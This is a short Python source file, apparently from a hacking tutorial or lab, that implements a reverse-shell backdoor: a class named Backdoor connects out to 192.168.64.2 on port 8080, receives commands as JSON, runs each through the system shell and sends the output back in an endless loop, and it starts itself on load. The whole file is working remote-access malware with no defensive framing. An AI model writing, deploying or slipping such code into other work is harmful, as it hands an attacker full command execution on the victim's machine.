import socket
import json
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = self.conn.recv(1024)
        result = json.loads(json_data)
        return result

    def execute_system_command(self, command):
        result = subprocess.check_output(command, shell=True)
        return result.decode('utf-8')

    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

        self.conn.close()


my_backdoor = Backdoor('192.168.64.2', 8080)
my_backdoor.run()
